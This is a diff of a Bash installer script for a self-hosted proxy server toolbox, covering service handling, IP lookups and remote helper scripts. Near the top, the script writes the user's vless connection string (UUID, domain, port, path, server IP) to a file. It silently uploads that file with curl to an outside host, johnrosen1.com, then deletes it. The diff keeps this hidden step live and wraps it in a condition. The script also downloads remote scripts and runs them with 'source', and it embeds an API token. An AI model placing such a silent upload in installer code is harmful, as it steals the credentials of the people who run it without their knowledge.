@@ -185,9 +185,11 @@ prasejson
 apt-get purge python-pil python3-qrcode -q -y
 apt-get autoremove -y
 cd /root
+if [[ -n ${uuid_new} ]]; then
 echo "vless://${uuid_new}@${domain}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(grpc_cdn_${myip})" &> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
+fi
 cd
 if [[ ${install_dnscrypt} == 1 ]]; then
   if [[ ${dist} = ubuntu ]]; then
@@ -259,24 +261,18 @@ install_status="$( jq -r '.installed' "/root/.trojan/config.json" )"
 if [[ $install_status != 1 ]]; then
   cp /etc/resolv.conf /etc/resolv.conf.bak1
   if [[ $(systemctl is-active caddy) == active ]]; then
-      systemctl stop caddy
-      systemctl disable caddy
-      fi
-      if [[ $(systemctl is-active apache2) == active ]]; then
-      systemctl stop apache2
-      systemctl disable apache2
-      fi
-      if [[ $(systemctl is-active httpd) == active ]]; then
-      systemctl stop httpd
-      systemctl disable httpd
-    fi
+      systemctl disable caddy --now
+  fi
+  if [[ $(systemctl is-active apache2) == active ]]; then
+      systemctl disable apache2 --now
+  fi
+  if [[ $(systemctl is-active httpd) == active ]]; then
+      systemctl disable httpd --now
+  fi
   curl --retry 5 -s https://ipinfo.io?token=56c375418c62c9 --connect-timeout 300 > /root/.trojan/ip.json
   myip="$( jq -r '.ip' "/root/.trojan/ip.json" )"
   localip=$(ip -4 a | grep inet | grep "scope global" | awk '{print $2}' | cut -d'/' -f1)
   myipv6=$(ip -6 a | grep inet6 | grep "scope global" | awk '{print $2}' | cut -d'/' -f1)
-  if [[ -n ${myipv6} ]]; then
-  curl --retry 5 -s https://ipinfo.io/${myipv6}?token=56c375418c62c9 --connect-timeout 300 > /root/.trojan/ipv6.json
-  fi
 fi
 myip="$( jq -r '.ip' "/root/.trojan/ip.json" )"
 localip=$(ip -4 a | grep inet | grep "scope global" | awk '{print $2}' | cut -d'/' -f1)
@@ -533,19 +529,16 @@ MasterMenu() {
     source userinput.sh
     userinput_full
     prasejson
-    rm userinput.sh
     ## 检测证书是否已有
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/detectcert.sh
     source detectcert.sh
     detectcert
-    rm detectcert.sh
     ## 开始安装
     TERM=ansi whiptail --title "开始安装" --infobox "安装开始,请不要按任何按键直到安装完成(Please do not press any button until the installation is completed)!" 7 68
     colorEcho ${INFO} "安装开始,请不要按任何按键直到安装完成(Please do not press any button until the installation is completed)!"
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/system-upgrade.sh
     source system-upgrade.sh
     upgrade_system
-    rm system-upgrade.sh
     ## 基础软件安装
     install_base
     echo "nameserver 1.1.1.1" > /etc/resolv.conf
